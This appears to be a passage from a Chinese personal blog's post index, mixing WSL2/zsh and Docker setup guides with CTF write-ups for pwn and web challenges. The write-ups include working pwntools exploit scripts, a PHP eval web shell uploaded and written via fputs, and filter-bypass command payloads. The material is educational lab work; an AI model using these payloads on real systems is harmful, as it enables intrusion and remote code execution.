https.https://github.com.proxy echo \"Proxy has been closed.\" } test_setting(){ echo \"Host IP:\" ${hostip} echo \"WSL IP:\" ${wslip} echo \"Try to connect to Google...\" resp=$(curl -I -s --connect-timeout 5 -m 5 -w \"%{http_code}\" -o /dev/null www.google.com) if [ ${resp} = 200 ]; then echo \"Proxy setup succeeded!\" else echo \"Proxy setup failed!\" fi } if [ \"$1\" = \"set\" ] then set_proxy elif [ \"$1\" = \"unset\" ] then unset_proxy elif [ \"$1\" = \"test\" ] then test_setting else echo \"Unsupported arguments.\" fi 将第四行的端口改为自己的端口（即代理软件中允许局域网访问的端口）后，保存至~/proxy.sh，操作如下： source ~/proxy.sh set #打开代理 source ~/proxy.sh unset #关闭代理 source ~/proxy.sh test #测试代理连通性 如果设置正确，但是测试无法连通，请参照下面两个步骤： 打开控制面板-防火墙-允许应用或功能通过Windows Defender防火墙，将你的代理软件放行即可。 若上述操作还不成功，退回防火墙界面，在启用或者关闭防火墙中，将公用网络关闭（不建议关闭专用网络）。 安装zsh和oh-my-zsh 安装过程请保证外部网络的连通性！ 执行以下两个步骤： sudo apt install zsh sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" 安装过程中会询问是否将zsh设置为默认终端，输入y回车即可。 至此zsh安装成功。 安装powerline字体 在windows中安装更适用于zsh显示的字体（此步可以跳过，但是后续可能会有显示问题） 请保证网络连通！ 以管理员身份打开powershell终端，依次输入以下步骤即可： git clone https://github.com/powerline/fonts.git --depth=1 cd fonts set-executionpolicy bypass ./install.ps1 #该步骤需要等待较长时间 set-executionpolicy default 更改Windows Terminal外观 打开Terminal，在下拉栏中选择设置；在左侧栏中找到Ubuntu点击进入，下滑找到外观点击进入，选择配色方案为One Half Dark，字体为 DejaVu Sans Mono for Powerline。 其他字体可能导致Tmux的显示问题。 安装zsh主题和插件 这里推荐一主题二插件。 主题是自带的，无需下载。插件下载方法如下： 请保证网络连通！ zsh-autosuggestions（历史命令显示） git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions zsh-syntax-highlighting（高亮命令和命令检查） git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting 然后进入.zshrc，编辑以下参数： ... ZSH_THEME=\"ys\" #使用ys主题 ... plugins=( git virtualenv zsh-autosuggestions zsh-syntax-highlighting ) 然后重启终端或者更新.zshrc即可看到效果： source .zshrc 解决zsh-syntax-highlighting卡顿问题 产生原因：zsh-syntax-highlighting插件会从/mnt中的windows文件系统中寻找命令，由于文件数量过于庞大而造成的卡顿。 由于没有适合的替代品，同时我们还需要使用windows中的一些应用（如vscode、docker等），这里提供一种两全其美的方法： 参考：syntax highlighting is super slow in WSL2 · Issue #790 · zsh-users/zsh-syntax-highlighting (github.com) 打开/etc/wsl.conf，添加以下内容： [interop] appendWindowsPath = false 然后重启wsl： wsl --shutdown 接着打开.zshrc，在末尾添加上： # .zshrc ### Windows ### export PATH=\"$PATH:/mnt/c/Users/lesmo/AppData/Local/Microsoft/WindowsApps\" export PATH=\"$PATH:/mnt/c/Users/lesmo/AppData/Local/Programs/Microsoft VS Code/bin\" export PATH=\"$PATH:/mnt/c/Program Files/Docker/Docker/resources/bin\" export PATH=\"$PATH:/mnt/c/ProgramData/DockerDesktop/version-bin\" export PATH=\"$PATH:/mnt/c/WINDOWS\" 其中用户名请根据实际更改，vscode和docker的路径请按需增加（不用可注释）。 重启终端即可解决卡顿。 至此，终端界面配置全部结束，备份下自用的配置文件： https://www.yuque.com/a13xtang/uh7onz/cyofhr0q2tnw5g27?singleDoc# 安装Tmux Tmux是非常好用的终端复用工具（效率工具），安装只需一个步骤： sudo apt-get install tmux Tmux的具体使用方法请参考：Tmux教程 （一文就够）_LYF0816LYF的博客-CSDN博客 安装Tmux插件 请保证网络连通！ 下载tpm： git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm 接着打开~/.tmux.conf文件（没有即创建），输入： # Settings set -sg escape-time 1 # List of plugins set -g @plugin 'tmux-plugins/tpm' set -g @plugin 'tmux-plugins/tmux-","date":"2023-10-07","objectID":"/articles/2023/10/%E5%9C%A8win11%E4%B8%AD%E6%89%93%E9%80%A0%E8%BF%91%E4%B9%8E%E5%AE%8C%E7%BE%8E%E7%9A%84ubuntu%E7%BB%88%E7%AB%AF/:2:0","tags":["Linux","Ubuntu","美化","WSL2"],"title":"在Win11中打造近乎完美的Ubuntu终端","uri":"/articles/2023/10/%E5%9C%A8win11%E4%B8%AD%E6%89%93%E9%80%A0%E8%BF%91%E4%B9%8E%E5%AE%8C%E7%BE%8E%E7%9A%84ubuntu%E7%BB%88%E7%AB%AF/"},{"categories":["Docker"],"content":" 参考文章：x86架构的Ubuntu上通过Docker运行ARM架构的系统-CSDN博客 0x01 Docker安装 最简单快速的安装方法：使用阿里云镜像的一键安装脚本： curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 结束即安装完成。 0x02 使用Docker注册QEMU虚拟环境 每次重启宿主机均需注册（运行qemu-user-static镜像）一次 首先拉取multiarch/qemu-user-static镜像： sudo docker pull --platform linux/amd64 multiarch/qemu-user-static 然后注册环境，即运行容器： sudo docker run --rm --privileged multiarch/qemu-user-static --reset -p yes 至此环境注册完成。 0x03 拉取Ubuntu 22.04 armv7镜像 该镜像整合了大部分运行库和gdb-mutiarch调试程序，拉取到本地： sudo docker pull alextang223/arm-ubuntu-gdb 直接运行该容器即可进入arm32虚拟环境： sudo docker run -it --rm --name arm-container --platform linux/arm/v7 alextang223/arm-ubuntu-gdb /bin/bash 0x04 环境演示 /data文件夹存放待测试文件 ","date":"2023-10-05","objectID":"/articles/2023/10/%E4%BD%BF%E7%94%A8docker%E5%9C%A8x86%E6%9E%B6%E6%9E%84%E4%B8%8A%E8%BF%90%E8%A1%8Carm%E6%9E%B6%E6%9E%84%E7%9A%84ubuntu%E7%B3%BB%E7%BB%9F/:0:0","tags":["ubuntu","ARM","Docker"],"title":"使用docker在x86架构上运行ARM架构的ubuntu系统","uri":"/articles/2023/10/%E4%BD%BF%E7%94%A8docker%E5%9C%A8x86%E6%9E%B6%E6%9E%84%E4%B8%8A%E8%BF%90%E8%A1%8Carm%E6%9E%B6%E6%9E%84%E7%9A%84ubuntu%E7%B3%BB%E7%BB%9F/"},{"categories":["WriteUp"],"content":"CyberChef’s Secret 实际上是Base加密的套娃，这里根据提示使用cyberchef的magic方法 直接得flag 机密图片 不会做。看wp得知是LSB隐写。关于LSB隐写可以参考：浅谈LSB隐写解题与出题 - 知乎 (zhihu.com) 使用Stegsolve工具打开图片，然后发现rgb的通道0都有额外数据： 于是使用data extract，选中RGB的第0通道，发现flag： 流量！鲨鱼！ 之前没有做过流量分析的题目，正好用这题入门一下。 首先使用WireShark打开流量文件，发现流量很大 我们首先从http看起，发现其中有很多对目录的请求，而且基本上是404 这里我们猜测实际上是一个目录爆破的过程，那么我们需要筛掉不成功的响应，这里使用 http \u0026\u0026 http.response.code == 200 这里我们发现，其中有很多一样长度的文件，内容都是提示system不能执行一个空白的命令，说明这个是一个RCE的流量。在文件中还发现攻击者希望结果以base64结构输出。这里直接找最短的包，最终发现这个请求： 很像是base加密，于是放到cyberchef中，发现是两次base加密： 得到flag。 压缩包们 提示是压缩包，先用010打开： 发现是flag.zip。但是发现文件头不对，改为50 4B 03 04(pk)。然后将后缀改为zip解压： 这里发现需要密码，看看压缩包属性： 没看到什么信息。 回去010，发现尾部有些信息： 疑似是base加密，解密后发现： 那么直接6位数字爆破即可： （这里使用的是Ziperello进行破解，ARCHPR无法破解，不知道为什么） 打开文本发现flag： flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc} 空白格 根据题目提示，应该是WriteSpace解密： 解密网站：Whitelips the Esoteric Language IDE (vii5ard.github.io) 隐秘的眼镜 SilentEye加密，直接使用工具解密： 补完收工。 ","date":"2023-10-04","objectID":"/articles/2023/10/newstarctf2023-week1-misc/:0:0","tags":["CTF","Misc","WriteUp"],"title":"NewStarCTF2023-Week1-Misc","uri":"/articles/2023/10/newstarctf2023-week1-misc/"},{"categories":["WriteUp"],"content":"ret2text 首先checksec 发现程序开启GOT完全只读和栈不可执行，但是没有开启随机化和Canary。 扔进ida64看下： 发现read处存在溢出（buff只有32字节但是读了256字节）。 同时发现后门函数backdoor： 于是就是一道非常标准的ret2text，这里通过buf的溢出劫持RIP指向backdoor进行执行即可。 根据ida的显示，buf距离栈底20h的距离，64位程序栈单元是8字节，backdoor的后门地址是0x4011fb。同时，由于跳过了call的步骤直接跳转到backdoor地址执行，可能破坏原有的堆栈平衡，这里将backdoor的ret地址（0x40122D）在执行前丢进栈，保证堆栈平衡。 所以payload如下： from pwn import * context(arch = 'amd64', os = 'linux', log_level = 'debug') #r = process('./ret2text') r = remote('node4.buuoj.cn',29883) offset = 0x20 backdoor = 0x4011fb payload = b'a' * offset + b'b' * 8 + p64(0x40122D) + p64(backdoor) r.sendafter('magic',payload) r.interactive() 然后远程连接程序即可： ezshellcode 首先checksec，发现开启了栈保护和部分RELRO ida64，发现主要代码就如下所示： 这里我们发现buf被存放在mmap申请（映射）的0x66660000的地址，并且后面直接用read读了256个字节。最后jumpout直接跳转到buf所在位置进行执行。 结合题目的意思，应该是只要将shellcode读入即可。 我们直接运行一下程序，也证明了我的猜测： 下面只要找任意一个小于256字节的shellcode传入即可。 这里直接使用pwntool自带的shellcraft。 from pwn import * context(arch='amd64',os='linux') r = process(\"./ezshellcode\") payload = asm(shellcraft.sh()) #r.recvuntil(b'magic\\n') r.sendafter(b'magic\\n',payload) r.interactive() 注意这里一定要将\\n读入，否则进入shell就会直接退出。 newstar shop 首先checksec，发现保护全开 先用ida打开一下： 发现应该是一个互动的程序。依次查看三个函数： shop unsigned __int64 shop() { int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"=============================\"); puts(\"===Welcome to newstar shop===\"); puts(\"=============================\"); puts(\"1.newstar's gift 20$\"); puts(\"2.pwn write up 40$\"); puts(\"3.shell 9999$\"); puts(\"\\n\"); puts(\"All things are only available for one day!\"); puts(\"What do you want to buy?\"); puts(\"\\n\"); if ( (int)__isoc99_scanf(\"%d\", \u0026v1) \u003c= 0 ) puts(\"Invalid input\"); if ( v1 != 3 ) { if ( v1 \u003e 3 ) { LABEL_17: puts(\"nothing here\"); puts(\"\\n\"); return v2 - __readfsqword(40u); } if ( v1 == 1 ) { if ( (unsigned int)money \u003e 19 ) { money -= 20; puts(\"You buy a newstar's gift\"); puts(\"That is the gift:\"); puts(\"What will happen when int transfer to unsigned int?\"); goto LABEL_10; } } else { if ( v1 != 2 ) goto LABEL_17; if ( (unsigned int)money \u003e 39 ) { money -= 40; puts(\"You buy a pwn write up\"); puts(\"That is free after the match,haha\"); goto LABEL_10; } } puts(\"Sorry,you don't have enough money\"); LABEL_10: puts(\"\\n\"); return v2 - __readfsqword(40u); } if ( (unsigned int)money \u003e 9998 ) { money = 0; puts(\"How do you buy it?\"); puts(\"\\n\"); system(\"/bin/sh\"); } else { puts(\"Sorry,you don't have enough money\"); puts(\"\\n\"); } return v2 - __readfsqword(40u); } 这里发现，总共可以用money购买三种商品，我们感兴趣的肯定就是shell。也就是说，只要能买第三项就可以直接getshell。我们肯定不回去赚9999的（当然似乎也可以）。 这里有个很重要的发现，在第一个gift处提示：What will happen when int transfer to unsigned int?。我们发现每次检查金额的时候，都会将int类型的money强制转化为unsigned int。这里直接想到整数溢出，也就是将money变为负的即可。但是仅凭shop只能将money变为0。我们需要再找一个“扣钱”的步骤。 于是在main函数中，我们发现了一个dont_cry函数： 发现，这里可以无条件的将money扣除50，但是有且仅有一次机会。这足够了。 首先我们确定money初始值是100（64h），那么我们在shop购买两次writeup然后直接dont_cry就可以溢出了。 连接靶机，依次输入： 1 2 1 2 3 1 3 ls cat flag 即可拿到flag p1eee 应该是绕过pie保护，其实是pie并不会将地址的低12位（也就是1.5个字节随机化） 根据题目，发现后门函数和实际ret的值只差了最后一个字节（改为\\x69即可） exp如下，（其实直接输入0x28个a加上一个i就可以getshell，因为最后\\x69是可见字符i） from pwn import * context(arch='amd64',os='linux',log_level='debug') r = process('./pwn') r.recvuntil(b'pie!!!\\n') r.send(b'a' * 0x28 + b'\\x69') r.interactive() random 通过ctype库加载libc.so库，使用同样的time(0)达到产生同样随机数的效果，然后system($0)同样可以getshell from pwn import * from LibcSearcher import * from ctypes import * file_name = './random' debug = 0 if debug: io = remote('node4.buuoj.cn',26238) else: io = process(file_name) elf = ELF(file_name) context(arch = elf.arch,log_level = 'debug',os = 'linux') def dbg(): gdb.attach(io) libc = cdll.LoadLibrary('libc.so.6') libc.srand(libc.time(0)) a = libc.random() io.sendlineafter('number?\\n',str(a)) io.interactive() ","date":"2023-10-03","objectID":"/articles/2023/10/newstarctf2023-week1-pwn/:0:0","tags":["CTF","Pwn","WriteUp"],"title":"NewStarCTF2023-Week1-Pwn","uri":"/articles/2023/10/newstarctf2023-week1-pwn/"},{"categories":["WriteUp"],"content":"写在前面 Web题目总共7题，截至10-1日晚本人做题情况为： 题目还是比较基础的，RCE的PHP非法字符是真的没有接触过，这也是比较有收获的一点。最后一题其实压根没往弱口令的方向去想，以后涉及到登录的题目第一想法肯定得是弱口令。 泄露的秘密 这题我压根没扫dir，试了一下www.zip结果就直接出来了。 一个是robot.txt一个是index.php 结果为：flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous} ","date":"2023-10-02","objectID":"/articles/2023/10/newstarctf2023-week1-web/:0:0","tags":["Web","CTF","WriteUp"],"title":"NewStarCTF2023-Week1-Web","uri":"/articles/2023/10/newstarctf2023-week1-web/"},{"categories":["WriteUp"],"content":"Begin of Upload 显然是需要上传马的。这里一定要看下前端有没有拦截： 发现有限制拓展名，那这里就先改名Jpg上传。暂时不知道后端有没有拦截，因此先试试直接改包 \u003c?php @eval($_POST['cmd']); ?\u003e 将一句话木马保存为shell.jpg上传，抓包： 直接将后缀改为php，发现上传成功： 直接蚁剑连接就可拿到flag： Begin of HTTP 发现是闯关类的 第一个GET传参很简单： ?ctf=1即可 第二关POST传参，发现secert在源码里： \u003c!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --\u003e 解码后得：n3wst4rCTF2023g00000d 使用hackbar或者抓包传参即可： 第三关： 显然是改文请求头，发现power在cookie中，直接改即可： 第四关： 和浏览器信息相关的请求头是User-Agent，直接改为NewStarCTF2023即可（不要加浏览器！） 第五关： 从何处来？改Referer即可。 最后一个关： 和本地访问有关的是：X-Forwarded-For或者X-Real-IP，发现是X-Real-IP，添加头为127.0.0.1发送即可： ErrorFlask 这里本来想的是命令注入这类的东西，但是试了几个不太行。回头看看Error，大概知道是报错的问题，于是直接搞点错误： 发现是python，我们发现app.py是源文件，而且错误好像还可以展开的样子：打开来看看 发现flag。 Begin of PHP \u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_GET['key1']) \u0026\u0026 isset($_GET['key2'])){ echo \"=Level 1=\u003cbr\u003e\"; if($_GET['key1'] !== $_GET['key2'] \u0026\u0026 md5($_GET['key1']) == md5($_GET['key2'])){ $flag1 = True; }else{ die(\"nope,this is level 1\"); } } if($flag1){ echo \"=Level 2=\u003cbr\u003e\"; if(isset($_POST['key3'])){ if(md5($_POST['key3']) === sha1($_POST['key3'])){ $flag2 = True; } }else{ die(\"nope,this is level 2\"); } } if($flag2){ echo \"=Level 3=\u003cbr\u003e\"; if(isset($_GET['key4'])){ if(strcmp($_GET['key4'],file_get_contents(\"/flag\")) == 0){ $flag3 = True; }else{ die(\"nope,this is level 3\"); } } } if($flag3){ echo \"=Level 4=\u003cbr\u003e\"; if(isset($_GET['key5'])){ if(!is_numeric($_GET['key5']) \u0026\u0026 $_GET['key5'] \u003e 2023){ $flag4 = True; }else{ die(\"nope,this is level 4\"); } } } if($flag4){ echo \"=Level 5=\u003cbr\u003e\"; extract($_POST); foreach($_POST as $var){ if(preg_match(\"/[a-zA-Z0-9]/\",$var)){ die(\"nope,this is level 5\"); } } if($flag5){ echo file_get_contents(\"/flag\"); }else{ die(\"nope,this is level 5\"); } } 这么一大段代码：，总结下来有几个考点: 绕过md5 绕过sha1 绕过strcmp 绕过is_numeric 绕过preg_match 我们一个个解决： md5=md5，这种类型可以直接传入数组，因为md5(数组)=null，null=null sha1同理。md5和sha1还可以使用0e绕过（得益于php的弱类型比较），具体参考：PHP中sha1()函数和md5()函数的绕过_sha1绕过-CSDN博客。我这里使用的数组绕过，简单又快捷 strcmp(数组,anystring) ==0 is_numeric(字符串)==false，根据弱类型比较，‘数字+字符’ == 数字。 preg_match(任意规则，数组)=0，当然，由于flag5在源码中不存在，必须在POST中传入一个flag5。 综上，payload为 R!C!E 题目够阴。 首先使用md5碰撞将password找出来，示例代码如下： import hashlib def md5crack(pre,num,n): for i in range(0,num): print(\"[+]Check {} for {}.\".format(i,pre)) if (hashlib.md5(str(i).encode(\"UTF-8\")).hexdigest()[0:n] == str(pre)): print(\"[+]{} correct!The md5 is {}.\".format(i,hashlib.md5(str(i).encode(\"UTF-8\")).hexdigest())) break else: print(\"[+]{} wrong!\".format(i)) md5crack(\"c4d038\",999999,6) 发现password=114514 下面，我们发现直接POST传e_v.a.l不会接收到任何数据，原因是php会对非法字符进行过滤，并将其修改为__（下划线）。但是该操作只会进行一次。（神奇的脑回路）非法字符如下： 于是为了让e_v.a.l中的.不被替换，我们将其中的下划线改为非法字符(])，然后让其变化一次阻止其继续变化。 password=114514\u0026e[v.a.l=phpinfo(); 成功了： 这里发现没有屏蔽fputs，直接写入木马，然后上蚁剑： fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[cmd]);?\u003e'); Easy Login 以后碰到用户名密码一定先弱口令爆破！！！ 这里payload使用弱密码字典，但是记得使用md5加密。 爆破结果如下，找到字节数和其他的结果不同的结果就是答案： 答案就是670b14728ad9902aecba32e22fa4f6bd（解密后是000000）。 这里登录后，在终端中CTRL-D退出终端，寻找历史记录，提示使用BurpSuite。 于是使用burpsuite。直接抓包发现没有什么信息。但是http请求记录里面有一个可疑点： 进去查看返回包就发现flag。 Web完结。 ","date":"2023-10-02","objectID":"/articles/2023/10/newstarctf2023-week1-web/:1:0","tags":["Web","CTF","WriteUp"],"title":"NewStarCTF2023-Week1-Web","uri":"/articles/2023/10/newstarctf2023-week1-web/"},{"categories":["Pwn"],"content":"首先checksec： 我靠，除了栈保护都开了（RELRO：禁止GOT表写入；NX：栈不可执行；PIE：地址随机化），直觉告诉我这题不会是Pwn。 看下反编译： Tell me what you want to execve 这里输入了一个变量a，（这个a还是在.bss区，更不可能是栈溢出），经过fun函数处理后直接system执行了。那么现在关键就是搞清楚fun函数干了什么事情。 原来是字符串翻转啊。直接exp。 exp /bin/sh 翻转为 hs/nib/ 直接连服务器 nc node4.anna.nssctf.cn 28509 输入hs/nib/,然后就getshell了 收工 ","date":"2023-09-24","objectID":"/articles/2023/09/re-or-pwn/:0:0","tags":["CTF","Pwn","二进制","WriteUp"],"title":"NISACTF 2022 ReorPwn?","uri":"/articles/2023/09/re-or-pwn/"},{"categories":["Pwn"],"content":"思路 首先checksec： 发现64位，只开启了NX。 反编译： 首先需要输入一个size_t，如果长度小于10才能进read进行泄露。 这里考虑整数溢出绕过判断： size_t a = -1;那么(int) a = -1;但是(unsigned int) a = 4294967295;也就是2^32-1 发现后门函数： 直接调用system(’/bin/sh’)，地址为400726。 buff的溢出距离是10h，直接写payload了 exp exp中的0x40073A是后门函数的返回地址，这里是为了64位程序的栈平衡。 from pwn import * context(arch = 'amd64', os = 'linux', log_level = 'debug') #r = process(\"./babystack\") r = remote('node4.anna.nssctf.cn', 28925) offset = 0x10 backdoor = 0x400726 r.sendlineafter('name:', '-1') payload = b'a' * offset + b'a' * 8 + p64(0x40073A) + p64(backdoor) r.sendafter('name?', payload) r.interactive() getshell ┌──(kali㉿kali)-[~/Desktop] └─$ python exp.py [+] Opening connection to node4.anna.nssctf.cn on port 28925: Done /home/kali/Desktop/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes r.sendlineafter('name:', '-1') /home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes res = self.recvuntil(delim, timeout=timeout) [DEBUG] Received 0x22 bytes: b'*' * 0x22 [DEBUG] Received 0xc6 bytes: b'\\n' b'* Welcome to the BJDCTF! *\\n' b'* And Welcome to the bin world! *\\n' b\"* Let's try to pwn the world! *\\n\" b'* Please told me u answer loudly!*\\n' b'[+]Are u ready?\\n' b'[+]Please input the length of your name:\\n' [DEBUG] Sent 0x3 bytes: b'-1\\n' /home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py:831: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes res = self.recvuntil(delim, timeout=timeout) [DEBUG] Received 0x11 bytes: b\"[+]What's u name?\" [DEBUG] Sent 0x28 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ 00000010 61 61 61 61 61 61 61 61 3a 07 40 00 00 00 00 00 │aaaa│aaaa│:·@·│····│ 00000020 26 07 40 00 00 00 00 00 │\u0026·@·│····│ 00000028 [*] Switching to interactive mode [DEBUG] Received 0x1 bytes: b'\\n' $ ls [DEBUG] Sent 0x3 bytes: b'ls\\n' [DEBUG] Received 0x6d bytes: b'bin\\n' b'boot\\n' b'dev\\n' b'etc\\n' b'flag\\n' b'flag.txt\\n' b'home\\n' b'lib\\n' b'lib32\\n' b'lib64\\n' b'media\\n' b'mnt\\n' b'opt\\n' b'proc\\n' b'pwn\\n' b'root\\n' b'run\\n' b'sbin\\n' b'srv\\n' b'sys\\n' b'tmp\\n' b'usr\\n' b'var\\n' bin boot dev etc flag flag.txt home lib lib32 lib64 media mnt opt proc pwn root run sbin srv sys tmp usr var $ cat flag [DEBUG] Sent 0x9 bytes: b'cat flag\\n' [DEBUG] Received 0x2d bytes: b'NSSCTF{2ff0f50c-8003-461f-9458-8358f6a736bf}\\n' NSSCTF{2ff0f50c-8003-461f-9458-8358f6a736bf} $ [*] Interrupted [*] Closed connection to node4.anna.nssctf.cn port 28925 ","date":"2023-09-24","objectID":"/articles/2023/09/2020babystack2-0/:0:0","tags":["CTF","Pwn","WriteUp"],"title":"BJDCTF 2020 babystack2.0","uri":"/articles/2023/09/2020babystack2-0/"},{"categories":["Pwn"],"content":"思路 首先checksec： 64位，只开启了NX。 反编译，发下入口就是溢出函数: 溢出距离0x10。同时发现后门函数： 地址是：0x4005b6 exp from pwn import * context(arch = 'amd64', os = 'linux', log_level = 'debug') #r = process(\"./babystack\") r = remote(\"node5.anna.nssctf.cn\",28017) offset = 0x10 backdoor = 0x4005b6 payload = b'a' * offset + b'a' * 8 + p64(backdoor) r.sendline(payload) r.interactive() getshell ┌──(kali㉿kali)-[~/Desktop] └─$ python exp.py [+] Opening connection to node5.anna.nssctf.cn on port 28017: Done [DEBUG] Sent 0x21 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ 00000010 61 61 61 61 61 61 61 61 b6 05 40 00 00 00 00 00 │aaaa│aaaa│··@·│····│ 00000020 0a │·│ 00000021 [*] Switching to interactive mode $ ls [DEBUG] Sent 0x3 bytes: b'ls\\n' [DEBUG] Received 0x22 bytes: b'bin\\n' b'dev\\n' b'flag\\n' b'lib\\n' b'lib32\\n' b'lib64\\n' b'pwn5\\n' bin dev flag lib lib32 lib64 pwn5 $ cat flag [DEBUG] Sent 0x9 bytes: b'cat flag\\n' [DEBUG] Received 0x2d bytes: b'NSSCTF{ef171f2b-bb3e-4a2d-bdf8-9a8632048193}\\n' NSSCTF{ef171f2b-bb3e-4a2d-bdf8-9a8632048193} $ [*] Interrupted [*] Closed connection to node5.anna.nssctf.cn port 28017 ","date":"2023-09-24","objectID":"/articles/2023/09/gift-pwn/:0:0","tags":["CTF","Pwn","二进制","WriteUp"],"title":"SWPUCTF 2021 新生赛 gift_pwn","uri":"/articles/2023/09/gift-pwn/"},{"categories":["Pwn"],"content":"思路 根据题目给出的代码： import os art = ''' (( \"####@@!!$$ )) `#####@@!$$` )) (( '####@!!$: (( ,####@!!$: )) .###@!!$: `##@@!$: `#@!!$ !@# `#@!$: @#$ #$ `#@!$: !@! '@!$: '`\\ \"!$: /`' '\\ '!: /' \"\\ : /\" -.\"-/\\\\\\-.\"//.-\"/:`\\.\"-.JrS\".\"-=_\\\\ \" -.\"-.\\\\\"-.\"//.-\".`-.\"_\\\\-.\".-\\\".-//''' print(art) print(\"My_shell_ProVersion\") blacklist = ['cat','ls',' ','cd','echo','\u003c','${IFS}'] while True: command = input() for i in blacklist: if i in command: exit(0) os.system(command) 看出来实际上是一道绕过WAF的RCE题目。需要绕过的名单是：['cat','ls',' ','cd','echo','\u003c','${IFS}'] 这里空格可以用$IFS$9代替，然后命令的话创建变量替换即可。 exp a=l;b=s;$a${b}$IFS$9\\ a=c;b=at;$a${b}$IFS$9flag ","date":"2023-09-24","objectID":"/articles/2023/09/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-nc%E7%AD%BE%E5%88%B0/:0:0","tags":["CTF","Pwn","WriteUp","二进制"],"title":"SWPUCTF 2021 新生赛 nc签到","uri":"/articles/2023/09/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-nc%E7%AD%BE%E5%88%B0/"},{"categories":["Pwn"],"content":"这里以 bamboofox 中的 ret2libc3 为例 点击下载: ret2libc3 在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 ➜ ret2libc3 checksec ret2libc3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"No surprise anymore, system disappeard QQ.\"); printf(\"Can you find it !?\"); gets((char *)\u0026v4); return 0; } 那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 https://github.com/niklasb/libc-database 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme https://github.com/lieanu/LibcSearcher 此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。 这里的思路是，通过puts打印出自己的got地址。因为打印的时候已经执行过一遍puts了，所以此时got中肯定存在puts的真实地址。 puts_plt = elf.plt['puts'] start = 0x080484D0 puts_got = elf.got['puts'] payload1 = b'a' * 112 + p32(puts_plt) + p32(start) + p32(puts_got) r.sendlineafter('!?',payload1) PS：这里的start地址实际上是_start函数的地址。这个函数可以认为是程序的起点。当然这里使用libc_start_main也是可以的。只要能让程序重新执行即可 泄露 puts 地址 获取 libc 版本 获取libc基址（puts的真实地址减去puts的Libc地址） 获取 system 地址与 /bin/sh 的地址（system的libc地址加上libc基址） 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) exp 如下： from pwn import * from LibcSearcher import LibcSearcher context(arch= 'i386', os = 'linux', log_level = 'debug') elf = ELF('./ret2libc3') r = process('./ret2libc3') puts_plt = elf.plt['puts'] start = 0x080484D0 puts_got = elf.got['puts'] payload1 = b'a' * 112 + p32(puts_plt) + p32(start) + p32(puts_got) r.sendlineafter('!?',payload1) puts_addr = u32(r.recv(4)) libc = LibcSearcher(\"puts\",puts_addr) libcbase_addr = puts_addr - libc.dump('puts') system_libc = libcbase_addr + libc.dump('system') str_bin_sh = libcbase_addr + libc.dump('str_bin_sh') payload2 = b'a' * 112 + p32(system_libc) + b'b' * 4 + p32(str_bin_sh) r.sendlineafter('!?',payload2) r.interactive() ","date":"2023-09-23","objectID":"/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/:0:0","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2libc-高级","uri":"/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/"},{"categories":["Pwn"],"content":"中级 中级ret2libc是指：程序中plt段包含system但是找不到/bin/sh字符串。这里大概的想法就是：因为一般的程序中输入可能需要用到gets函数，如果程序的数据段：一般是.bss段（拥有比较大的内存空间）有空余的空间（未使用的变量），可以通过gets输入到该区域中，然后直接使用即可。 如果直接跳转到plt中的函数地址，那么需要先在栈中放入返回地址，再放入参数 实例 这里以 bamboofox 中的 ret2libc2 为例 点击下载: ret2libc2 该题目与例 1 基本一致，只不过不再出现 /bin/sh 